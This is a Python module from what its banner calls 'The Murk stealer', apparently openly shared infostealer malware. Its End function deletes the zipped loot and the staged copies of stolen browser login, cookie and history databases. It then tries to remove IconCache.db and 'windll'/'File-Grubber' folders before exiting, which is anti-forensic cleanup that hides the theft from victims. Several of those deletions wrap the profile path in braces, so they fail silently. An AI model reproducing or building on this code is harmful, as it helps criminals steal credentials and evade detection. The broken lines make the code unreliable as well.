#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import _exit,remove,environ

def End(np):
    try:
        remove(f'{np[0]}.zip')
    except:
        pass
    try:
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
    except:
        pass
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\IconCache.db')
    except:
        pass 
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\windll')
    except:
        pass
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\windll\\File-Grubber')
    except:
        pass
    _exit(0)
